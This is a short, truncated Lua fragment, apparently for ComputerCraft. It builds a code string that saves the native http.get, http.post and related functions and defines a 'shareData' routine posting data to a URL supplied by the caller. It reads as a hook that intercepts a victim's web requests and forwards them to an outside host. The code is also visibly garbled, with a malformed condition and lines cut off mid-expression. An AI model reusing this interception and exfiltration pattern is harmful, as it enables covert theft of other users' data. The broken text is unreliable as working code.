return [[(function()
    if type(_G._G.http) == "table" and type(_G._G.http.post) == "function" then
        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, type(textutils) == "table" and type(textutils.urlEscape) == "function" and textutils.urlEscape or function(t)
            local i = 1
            while i <= #t do
                local b = t:sub(i, i):byte()
                if b >= 128)
        nativecode = type(nativecode or function(t)
         
        local function shareData(url, post, headers)
            nativepost(]] .. (({...})[1]) .. [[, post, headers)
            
